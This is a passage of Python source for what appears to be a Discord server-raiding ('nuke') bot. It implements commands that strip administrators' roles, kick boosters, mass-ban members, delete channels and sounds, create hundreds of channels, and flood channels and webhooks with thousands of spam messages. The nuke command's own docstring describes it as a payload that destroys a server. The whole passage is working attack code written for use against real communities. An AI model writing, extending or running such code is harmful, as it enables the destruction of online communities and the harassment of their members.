    await asyncio.gather(*[sema_run(
        sound.delete, semaphore, reason=user.settings.reason
    ) for sound in ctx.guild.soundboard_sounds[:25]])

@bot.command('strip_staff', aliases=['ss', 'stripstaff'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_strip_staff(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    members: List[discord.Member] = list(ctx.guild.members)
    demote: List[discord.Member] = []
    for member in members[:]:
        if member == ctx.guild.owner:
            members.remove(member)
            continue
        elif member.top_role.position >= ctx.guild.me.top_role.position:
            members.remove(member)
            continue
        elif member == ctx.author:
            continue
        elif member.guild_permissions.administrator or member.guild_permissions.manage_guild:
            demote.append(member)
    if demote:
        semaphore = asyncio.Semaphore(11)
        await asyncio.wait([asyncio.create_task(safe_task(
            sema_run, [], member.edit, semaphore, roles=[]
        )) for member in demote], timeout=15)

@bot.command('ban_boosters', aliases=['bb', 'banboosters', 'delete_boosts', 'banboosts', 'boosts'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_ban_boosters(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    await cmd_run(ctx, user, 'strip_staff')
    boosters = ctx.guild.premium_subscribers
    valid, _ = utils.check_members(ctx.author, boosters)
    if len(valid):
        semaphore = asyncio.Semaphore(10)
        await asyncio.wait([asyncio.create_task(safe_task(sema_run, [],
            member.kick, semaphore, reason=user.settings.reason
        )) for member in boosters], timeout=45)
        
@bot.command('ban_members', aliases=['bm', 'banall', 'banmembers', 'massban', 'mb'])
@command()
@cooldowns.check(180, server_cooldown=True)
async def cmd_ban_members(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    await cmd_run(ctx, user, 'strip_staff')
    valid, _ = utils.check_members(ctx.author, ctx.guild.members)
    valid = valid[:1000]
    for i in range(0, len(valid), 200):
        users = [discord.Object(id=member.id) for member in valid[i:i+200]]
        await ctx.guild.bulk_ban(users)
        await asyncio.sleep(0.5)

@bot.command('mess_server', aliases=['mess_guild', 'ms', 'mg', 'messserver'])
@command()
@cooldowns.check(60, server_cooldown=True)
async def cmd_mess_server(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    await mess_server(ctx.guild, user.settings, session)

@bot.command('create_webhooks', aliases=['cw', 'createweb'])
@command()
@cooldowns.check(3600 * 12, server_cooldown=True, min_members=config['small_server'])
async def cmd_create_webhooks(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    try:
        webhooks, channels = tuple(zip(*await safe_task(get_webhooks, [], ctx.guild, amount=50)))
    except ValueError:
        webhooks = ()
        channels = ()

    if len(webhooks) < 50:
        missing = 50 - len(webhooks)
        # Spaghetti code
        # await asyncio.wait([asyncio.gather(*[create_webhook(
        #     channel, user.settings
        # ) for channel in [
        #     channel for channel in ctx.guild.channels
        #     if not channel in channels
        #     and isinstance(channel, (discord.TextChannel, discord.VoiceChannel))
        # ][:missing]])], timeout=30)

        # Clean code :D
        tasks = []
        for channel in ctx.guild.channels:
            if not isinstance(channel, (discord.TextChannel, discord.VoiceChannel)):
                # Channel does not support webhooks
                continue
            if channel in channels:
                # Channel has webhook
                continue
            task = create_webhook(channel, user.settings)
            tasks.append(task)
        processor = asyncio.gather(*tasks[:missing])
        await asyncio.wait(processor, timeout=30)

@bot.command('spam_webhooks', aliases=['sw', 'spamweb', 'webs'])
@command()
@cooldowns.check(30, server_cooldown=True, min_members=config['small_server'])
async def cmd_spam_webhooks(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    webhooks = tuple(zip(*await safe_task(get_webhooks, [], ctx.guild, amount=50)))
    if not webhooks:
        return
    webhooks = webhooks[0]
    await asyncio.gather(*[spam_webhook(webhook, user.settings) for webhook in webhooks])

@bot.command('ping_all', aliases=['pa', 'pingall'])
# @command(Permissions(elevated_only=True))
@command(Permissions())
@cooldowns.check(30, server_cooldown=True, min_members=config['small_server'])
async def cmd_ping_all(ctx: commands.Context, user: User, amount: int = 1, *_):
    assert ctx.guild
    channels = sorted(ctx.guild.channels, key=lambda c: c.position)
    channels = [channel for channel in channels if isinstance(channel, (discord.TextChannel, discord.VoiceChannel))]
    if not user.is_elevated:
        amount = 1
    limit = 20
    if amount < 200:
        limit = 21
    elif amount < 150:
        limit = 22
    elif amount < 100:
        limit = 23
    elif amount < 10:
        limit = 25
    semaphore = asyncio.Semaphore(limit)
    await asyncio.gather(*[spam_channel(
        channel, user.settings, semaphore, amount=min(amount, 16) # pyright: ignore[reportArgumentType]
    ) for channel in channels])

# @bot.command('create_backup', aliases=['cb'])
# @command(Permissions())
# @cooldowns.check(360, server_cooldown=True, min_members=config['small_server'])
async def cmd_create_backup(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    backups = await db.get_backup(user_id=user.id)
    if not user.is_premium or not user.is_elevated:
        if len(backups) >= 5:
            embed = shared.get_embed('You have used all your 5 free backup slots', 'warning')
            embed.description = 'You can delete backups with the `.delete_backup` command'
            return await ctx.send(embed=embed)
    try:
        channel = await ctx.author.create_dm()
        message = await channel.send(f'Creating backup for {ctx.guild.name} (ID: {ctx.guild.id})')
    except discord.Forbidden:
        embed = shared.get_embed('Enable your DMs in order to create a backup', 'warning')
        return await ctx.send(embed=embed)
    key, backup = await create_backup(ctx.guild)
    backup_id = await db.add_backup(user.id, backup)
    if backup_id:
        embed = shared.get_embed(f'Created backup for {ctx.guild.name} (ID: {ctx.guild.id})')
        embed.description = f'Your backup ID: `{backup_id}`\nYour backup key: ||`{key}`||'
        try:
            await channel.send(embed=embed)
            await message.delete()
        except discord.Forbidden:
            await message.edit(embed=embed)
    else:
        embed = shared.get_embed(f'Failed to create backup for {ctx.guild.name} (ID: {ctx.guild.id})')
        try:
            await channel.send(embed=embed)
            await message.delete()
        except discord.Forbidden:
            await message.edit(embed=embed)

@bot.command('bypass', aliases=['bp'])
@command()
@cooldowns.check(3600, server_cooldown=True, min_members=10)
async def cmd_bypass(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    asyncio.create_task(cmd_run(ctx, user, 'mess_channels'))
    channels = sorted(ctx.guild.channels, key=lambda c: c.position)
    # 2x less messages than originally because of trolls
    amount = 1200 // len(channels) + 1
    limit = 20
    if amount < 200:
        limit = 21
    elif amount < 150:
        limit = 22
    elif amount < 100:
        limit = 23
    elif amount < 10:
        limit = 25
    async with locks['bypass']:
        semaphore = asyncio.Semaphore(limit)
        await asyncio.gather(*[spam_channel(
            channel, user.settings, semaphore, amount=amount # pyright: ignore[reportArgumentType]
        ) for channel in channels])

# @bot.command('super_bypass', aliases=['bypass_plus', 'spb', 'bpp', 'bypassplus'])
# @command()
# @cooldowns.check(180, server_cooldown=True)
async def cmd_super_bypass(ctx: commands.Context, user: User, *_):
    assert ctx.guild
    channels = [channel for channel in ctx.guild.channels if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.StageChannel))]
    to_delete = list(set(ctx.guild.channels) - set(channels))
    create_semaphore = asyncio.Semaphore(16)
    delete_semaphore = asyncio.Semaphore(16)
    spam_semaphore = asyncio.Semaphore(20)

    async def _create_channel():
        assert ctx.guild
        nonlocal channels
        async with create_semaphore:
            channel = await create_channel(ctx.guild, user.settings)
        channels.append(channel)
    
    async def channel_task():
        assert ctx.guild
        await asyncio.gather(*[_create_channel() for _ in range(500 - len(ctx.guild.channels))])
    
    async def delete_task():
        async def delete(channel: discord.abc.GuildChannel):
            async with delete_semaphore:
                await channel.delete(reason=user.settings.reason)
        await asyncio.gather(*[delete(channel) for channel in to_delete])

    async def spam_task(index: int):
        while 1:
            try:
                channel = channels[index]
            except IndexError:
                await asyncio.sleep(0.1)
                continue
            await spam_channel(channel, user.settings, spam_semaphore, amount=2300 // 500 + 1) # pyright: ignore[reportArgumentType]
            break
    
    asyncio.create_task(delete_task())
    asyncio.create_task(cmd_run(ctx, user, 'mess_channels'))
    await asyncio.sleep(0.5)
    asyncio.create_task(channel_task())
    await asyncio.wait([
        asyncio.create_task(spam_task(i)
    ) for i in range(499)], timeout=120)


@bot.command('nuke', aliases=['kill'])
@command()
@cooldowns.check(3600 * 2, server_cooldown=True)
async def cmd_nuke(ctx: commands.Context, user: User, *_):
    '''
    %0
    Nukes the server (destroys it)
    %1
    This payload includes kicking boosters, messing roles, replacing emojis, replacing stickers,
    replacing soundboard sounds, creating channels, creating roles. The bot will also send a total of
    6 000+ messages with your content.
    '''
    async def delete_channels():
        assert ctx.guild
        nonlocal old_channels
        while 1:
            try:
                if len(ctx.guild.channels) > 100:
                    semaphore = asyncio.Semaphore(20)
                    await asyncio.gather(*[
                        safe_task(sema_run, [], channel.delete, semaphore, reason=user.settings.reason)
                        for channel in old_channels
                    ])
                else:
                    await asyncio.gather(*[
                        channel.delete(reason=user.settings.reason)
                        for channel in old_channels
                    ])
            except discord.HTTPException:
                await asyncio.sleep(3)
                old_channels = [channel for channel in ctx.guild.channels if channel in old_channels]
            else:
                break

    async def webhook_thread():
        async def process_tasks():
            for task in asyncio.as_completed(tasks):
                webhook = await task
                if webhook:
                    asyncio.create_task(spam_webhook(webhook, user.settings))

        async def create(channel: discord.TextChannel):
            for _ in range(50):
                try:
                    return await create_webhook(channel, user.settings)
                except discord.HTTPException:
                    continue
        sorted_channels = sorted(channels, key=lambda c: c.position if c else -1)
        semaphore = asyncio.Semaphore(2)
        tasks = []
        for channel in sorted_channels:
            asyncio.create_task(spam_channel(channel, user.settings, semaphore))
            if channel:
                tasks.append(asyncio.create_task(create(channel)))
        processor = asyncio.create_task(process_tasks())
        await asyncio.sleep(1)
        try:
            await asyncio.wait_for(asyncio.shield(processor), timeout=10)
        except asyncio.TimeoutError:
            pass

    async def extra_payload():
        semaphore = asyncio.Semaphore(16)
        amount = 500
        amount -= create_amount
        tasks = []
        async def add_task():
            channel = await safe_task(sema_run,
                [], create_channel, semaphore, ctx.guild,
                user.settings
            )
            if channel:
                channels.append(channel)

        try:
            async with locks['create_channels']:
                for _ in range(amount):
                    tasks.append(asyncio.create_task(add_task()))
                await asyncio.wait(tasks, timeout=30)
        except discord.HTTPException:
            pass
        await cmd_run(ctx, user, 'ping_all')

    # async def extra_payload():
    #     semaphore = asyncio.Semaphore(16)
    #     semaphore_spam = asyncio.Semaphore(16)
    #     amount = 500
    #     amount -= 45
    #     tasks = []
    #     async def add_task():
    #         channel = await sema_run(create_channel, semaphore, ctx.guild, user.settings)
    #         if channel:
    #             await spam_channel(channel, user.settings, semaphore_spam, amount=1)

    #     try:
    #         async with locks['create_channels']:
    #             for _ in range(amount):
    #                 tasks.append(asyncio.create_task(add_task()))
    #             await asyncio.wait(tasks, timeout=30)
    #     except discord.HTTPException as exc:
    #         pass

    assert ctx.guild
    asyncio.create_task(science(ctx, user))
    old_channels = list(ctx.guild.channels)[:]
    # create_amount = user.settings.channel.create_amount
    create_amount = 50
    community = user.settings.guild.community
    channels: List[discord.TextChannel] = []
    if community:
        create_amount -= 2

    async with locks['nuke']:
        await ctx.guild.edit(community=False)
        asyncio.create_task(delete_channels())
        await asyncio.sleep(0.5)

        if community:
            _channels = await mess_server(ctx.guild, user.settings, session, community=community)
        else:
            _channels = asyncio.create_task(mess_server(ctx.guild, user.settings, session, community=community))
        channels = await asyncio.gather(*[create_channel(ctx.guild, user.settings) for _ in range(max(50, create_amount))])
        if community:
            channels += _channels # pyright: ignore[reportOperatorIssue]
        
        asyncio.create_task(extra_payload())
        # Start spamming webhooks + extra 2 seconds and then start next nuke
        asyncio.create_task(webhook_thread())
        await asyncio.sleep(2)

try:
    asyncio.run(main()) 
except KeyboardInterrupt:
    print('Shutdown.')